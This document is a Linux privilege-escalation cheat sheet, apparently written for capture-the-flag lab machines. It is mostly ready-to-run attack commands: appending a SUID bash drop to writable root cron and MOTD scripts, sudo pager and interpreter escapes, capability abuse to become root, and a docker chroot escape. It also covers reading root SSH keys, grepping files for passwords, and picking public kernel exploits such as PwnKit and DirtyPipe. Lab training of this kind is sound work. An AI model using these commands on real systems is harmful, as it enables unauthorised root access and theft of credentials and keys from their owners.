# 05 — Linux Privilege Escalation  (if a target is Linux)

**FIRST BURST, ALWAYS** — run all of these, read the output before guessing:
```bash
id; sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null          # SUID binaries
getcap -r / 2>/dev/null                          # file capabilities
cat /etc/crontab; ls -la /etc/cron.* /etc/update-motd.d/ 2>/dev/null
uname -a; cat /etc/os-release                     # kernel/distro (last-resort exploits)
```
Get a real TTY first if you're in a raw shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

## §1 ⭐ Writable root-cron script  (Tut10 Sarathos — hard flag)
```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.hourly
ls -la /srv/*/*.sh /opt/*/*.sh 2>/dev/null        # any script a root cron runs that YOU can write?
# e.g. mode 777, runs as root every minute -> append a SUID-bash drop:
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/to/root_cron.sh
sleep 65; /tmp/rootbash -p                          # -p keeps euid=root
# or just exfil the flag:
echo 'cat /root/flag_hard.txt > /tmp/f.txt; chmod 644 /tmp/f.txt' >> /path/to/root_cron.sh
```
Watch for cron jobs you can't see in crontab with **pspy** (see §6).

## §2 sudo -l → GTFOBins escape  (Marcadia, ARDOLIS)
```bash
sudo -l           # read EXACTLY what you may run (NOPASSWD lines)
```
Common escapes (check gtfobins.org — allowed, it's not GenAI):
```bash
sudo /usr/bin/more /etc/services       # then:  !/bin/sh          (pager escape — Marcadia)
sudo /usr/bin/less /etc/profile        # then:  !/bin/sh
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/php -r 'system("/bin/bash");'          # ARDOLIS
sudo /usr/bin/python3 -c 'import os;os.system("/bin/bash")'
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/awk 'BEGIN{system("/bin/sh")}'
sudo /usr/bin/nmap --interactive                     # then !sh  (old nmap)
sudo env /bin/bash
# sudo ALL / (ALL:ALL):   sudo su -   or   sudo /bin/bash
```

## §3 SUID / capabilities
```bash
find / -perm -4000 -type f 2>/dev/null      # cross-ref each against GTFOBins "SUID"
# examples:
/usr/bin/find . -exec /bin/sh -p \; -quit
cp /bin/bash /tmp/b; /usr/bin/<suid-binary> ... # bespoke per binary
# capabilities (cap_setuid = instant root — Presidential/DomDom):
getcap -r / 2>/dev/null
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'   # if python has cap_setuid+ep
tar -cvf /tmp/x.tar /root/.ssh/id_rsa       # if tar has cap_dac_read_search (read-any-file)
```

## §4 Writable MOTD / profile scripts  (Quodrona)
```bash
ls -la /etc/update-motd.d/              # writable? runs as root on next SSH login
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /etc/update-motd.d/00-header
# trigger: ssh in again (new session) -> /tmp/rootbash -p
ls -la /etc/profile.d/ ~/.bashrc        # same idea if a root process sources them
```

## §5 Kernel / char-device last resort  (STRATUS — only if nothing else)
```bash
uname -r                     # match to a public local-root CVE:
#   PwnKit (pkexec)  CVE-2021-4034   — nearly universal, self-contained C exploit
#   DirtyPipe        CVE-2022-0847   — kernel 5.8–5.16
#   Baron Samedit    CVE-2021-3156   — sudo < 1.9.5p2
#   DirtyCow         CVE-2016-5195   — very old kernels
ls -l /usr/bin/pkexec        # SUID present? PwnKit candidate
# compile & run the local PoC (offline copy in payloads/ if staged)
```

## §6 Other quick wins
```bash
# credentials lying around:
grep -rioE '(password|passwd|pass|secret|api_key)[=:].*' /etc /opt /home /var/www 2>/dev/null
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
# dangerous group membership:
id    # docker -> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
      # lxd/lxc, disk -> debugfs /dev/sda1, adm -> read logs
# hidden/loopback services (pivot):
ss -tlnp
# background processes & unseen cron (pspy — stage in payloads/):
./pspy64
# one-shot: linpeas (stage in payloads/):
./linpeas.sh | tee loot/linpeas.txt
```

## Find & read the flags (as root)
```bash
/tmp/rootbash -p            # or your root shell
cat /root/flag_hard.txt
find / -name '*flag*' -type f 2>/dev/null
grep -rl flag_ /home /root 2>/dev/null
```

## Gotchas
- Run the **first burst** before anything else — `sudo -l` + SUID + `getcap` + cron answer 90% of boxes.
- Writable file that root executes (cron / MOTD / service) = the Linux signature move. Look there.
- Potato world is Windows-only; on Linux it's files-root-runs, caps, sudo, kernel — in that order.
- Keep it gentle — no mass exploit spraying. Match the ONE kernel CVE to `uname -r`, don't shotgun.
